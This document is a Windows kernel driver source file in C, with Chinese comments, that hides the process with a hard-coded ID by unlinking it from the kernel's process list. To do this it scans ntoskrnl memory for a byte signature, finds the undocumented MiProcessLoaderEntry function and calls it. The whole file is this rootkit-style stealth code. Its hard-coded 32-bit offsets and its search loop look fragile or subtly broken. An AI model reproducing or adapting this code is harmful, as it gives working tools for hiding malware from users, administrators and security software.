        #include<ntifs.h>
        #include<intrin.h>
        PDRIVER_OBJECT g_DriverObject = NULL;
        CHAR szCodeFlag1[] = { 0xB1 ,0x1B ,0x88 ,0x45 ,0x0B };
        CHAR szCodeFlag2[] = { 0x8B,0xCE,0xF0 ,0x0F,0xBA,0x29,0x1F };
        typedef VOID(*FunMiProcessLoaderEntry)(ULONG ulEntry, LOGICAL lflag);

        NTSTATUS FindMiProcessLoaderEntryAddr(ULONG ulStartAddress,ULONG ulEndAddress,ULONG *retFunAddress){

            for (size_t i = ulStartAddress; i < ulEndAddress; i++)
            {
              if (memcmp(ulStartAddress, szCodeFlag1, sizeof(szCodeFlag1)) == 0) {
                if (memcmp(((char*)ulStartAddress + 0x23), szCodeFlag2, sizeof(szCodeFlag2)) == 0)
                { 
                  *retFunAddress = ulStartAddress;
                  return STATUS_SUCCESS;
                }
              }
              (char*)ulStartAddress++;
            }
            return -1;
          }

        NTSTATUS SearchNtosKenlAddr(PDRIVER_OBJECT pDriverObject,ULONG *retNtosAddr){
          PLIST_ENTRY HeadNode = NULL;
          PLIST_ENTRY NextNode = NULL;
          UNICODE_STRING usKernelFileName;
          PUNICODE_STRING pusTempKernelFileName;
          RtlInitUnicodeString(&usKernelFileName, L"ntoskrnl.exe");
          HeadNode = (PLIST_ENTRY)(pDriverObject->DriverSection);
          NextNode = HeadNode->Flink;
          while (NextNode!=HeadNode)
          {
                pusTempKernelFileName = (PUNICODE_STRING)((ULONG)NextNode+0x2c);
                if (RtlCompareUnicodeString(pusTempKernelFileName, &usKernelFileName,TRUE)==0)
                {
                    *retNtosAddr = (ULONG)NextNode;
                    return STATUS_SUCCESS;
                }
            NextNode = NextNode->Flink;
          }
            return -1;
        }

        NTSTATUS RemoveProcessListNode(PLIST_ENTRY pListNode) {
            ULONG ulNtosAddr;
            ULONG ulFunAddr;
            ULONG ulNtosStartAddr;
            ULONG ulNtosEndAddr;
            FunMiProcessLoaderEntry MyMiProcessLoaderEntry;
            SearchNtosKenlAddr(g_DriverObject, &ulNtosAddr);
            ulNtosStartAddr =*(ULONG*)(ulNtosAddr+0x18);
            ulNtosEndAddr = *(ULONG*)(ulNtosAddr + 0x20) + ulNtosStartAddr;
            FindMiProcessLoaderEntryAddr(ulNtosStartAddr, ulNtosEndAddr, &ulFunAddr);
            ulFunAddr = ulFunAddr - 0x1E;//获取函数头地址
            MyMiProcessLoaderEntry = ulFunAddr;
            MyMiProcessLoaderEntry(pListNode, FALSE);//true插入，false摘除
            return STATUS_SUCCESS;
        }
        NTSTATUS HideProcess(ULONG ulProcessid) {
            DWORD_PTR pEprocess = NULL;
            ULONG ulProcessID;
            pEprocess = (DWORD_PTR)PsGetCurrentProcess();
            PLIST_ENTRY HeadNode = NULL;
            PLIST_ENTRY NextNode = NULL;
            HeadNode = (PLIST_ENTRY)(pEprocess + 0xb8);
            NextNode = HeadNode->Flink;
            while (NextNode!=HeadNode)
            {
                pEprocess = ((DWORD_PTR)NextNode - 0xb8);//指向结构头
                ulProcessID = *(ULONG*)(pEprocess+0xB4);
                if (ulProcessID== ulProcessid)
                {
                    RemoveProcessListNode(NextNode);
                    return STATUS_SUCCESS;
                }
                NextNode = NextNode->Flink;
            }
            return -1;
        }

        VOID DriverUnload(PDRIVER_OBJECT pDriverObject) {

          DbgPrint("Unload Driver Success! ");

        }

        NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegPath) {
          DbgPrint("Load Driver Success!");
            pDriverObject->DriverUnload = DriverUnload;
            g_DriverObject = pDriverObject;
            HideProcess(3560);
          return STATUS_SUCCESS;
          }
